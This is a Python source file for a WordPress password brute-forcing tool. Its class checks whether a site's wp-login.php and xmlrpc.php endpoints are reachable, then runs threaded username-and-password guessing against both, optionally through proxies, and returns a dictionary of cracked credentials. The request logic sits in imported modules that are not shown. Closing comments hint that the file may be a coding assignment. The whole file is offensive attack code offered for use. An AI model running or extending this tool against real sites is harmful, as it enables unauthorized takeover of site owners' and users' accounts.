import concurrent.futures
import re
from threading import Thread, Event

from wploginphpbruteforcer import WpLoginPhpBruteforcer
from xmlrpcphpbruteforcer import XmlRpcPhpBruteforcer

MAX_SIZE_OF_THREADS = 100


class WPPassBruteforcer(object):

    def __init__(self, domain, additional_data=None, proxies=None):
        """
        Keep state of data that is collected and tries that were performed for efficieny
        :param domain: String. domain.
        :param additional_data: data that might be useful for performing the bruteforce (e.g., login page URL)
        :param proxies: working via HTTP proxies
        """
        self._domain = domain
        self._additional_data = additional_data
        self._proxies = proxies
        self._wp_login_bruteforcer_instance = WpLoginPhpBruteforcer(self._domain, proxies)
        self._is_wp_login_possible = False
        self._xmlrpc_bruteforcer_instance = XmlRpcPhpBruteforcer(self._domain, proxies)
        self._is_xmlrpc_possible = False
        self.is_method_possible()
        self._cracked_data = dict()
        self._not_finished_all_protocols = None
        self.event = Event()

    def bruteforce(self, usernames, passwords, threads=None, proxies=None):
        """
        this functhon run the run_bruteforce method in thread and return.
        :param usernames:list. list of usernames we want t 0 brutforce.
        :param passwords:list. list of passwords to perform the bruteforce.
        :param threads: Number of threads to use
        :param proxies: working via HTTP proxies.
        """
        try:
            self._not_finished_all_protocols = True
            Thread(target=self.__run_bruteforce, args=(usernames, passwords)).start()
        except Exception as e:
            print(e)

    def __run_bruteforce(self, usernames, passwords):
        """
        this method use thread pool and run the btuteforcers(xmkrpc,wp-login)
        and insert the solothins into future
        :param usernames:list. list of usernames we want t 0 brutforce.
        :param passwords:list/txt file. list of passwords to perform the bruteforce.
        """
        try:
            wp_login_future = None
            xmlrpc_future = None
            with concurrent.futures.ThreadPoolExecutor() as executor:
                if self._is_wp_login_possible:
                    wp_login_future = executor.submit(self._wp_login_bruteforcer_instance.bruteforce, usernames,
                                                      passwords)
                if self._is_xmlrpc_possible:
                    xmlrpc_future = executor.submit(self._xmlrpc_bruteforcer_instance.bruteforce, usernames, passwords)
                try:
                    if wp_login_future:
                        wp_login_result = wp_login_future.result()
                        if wp_login_result is not None:
                            for i in wp_login_result:
                                self._cracked_data[i] = wp_login_result[i]
                    if xmlrpc_future:
                        xmlrpc_result = xmlrpc_future.result()
                        if xmlrpc_result is not None:
                            for i in xmlrpc_result:
                                self._cracked_data[i] = xmlrpc_result[i]
                    self._not_finished_all_protocols = False
                    self.event.set()
                except Exception as e:
                    print(e)
        except Exception as e:
            print(e)

    def get_cracked_data(self):
        '''
        dictionary of username to successfully bruteforced password
        :return: dictionary of username to successfully bruteforced password + passwords
        '''
        try:
            if self._not_finished_all_protocols:
                self.event.wait()
                self.event.clear()
            values = self._cracked_data.values()
            crack_data = dict()
            for val in values:
                crack_data[val[0]] = val[1]
            return crack_data
        except Exception as e:
            print(e)

    def is_method_possible(self):
        '''
        check whether the bruteforce is possible for the url or not
        :return:list. list of tuples, whether the bruteforce is possible for the url or not
        '''
        try:
            if self._wp_login_bruteforcer_instance.is_method_possible():
                self._is_wp_login_possible = True
            else:
                self._is_wp_login_possible = False
            if self._xmlrpc_bruteforcer_instance.is_method_possible():
                self._is_xmlrpc_possible = True
            else:
                self._is_xmlrpc_possible = False
            return ('xmlrpc', self._is_xmlrpc_possible), ('wp-login', self._is_wp_login_possible)
        except Exception as e:
            print(e)

    # Feel free to add public method that you consider to be relevant for the users
    # user _ and __ for private and protected methods that should not be used outside the class
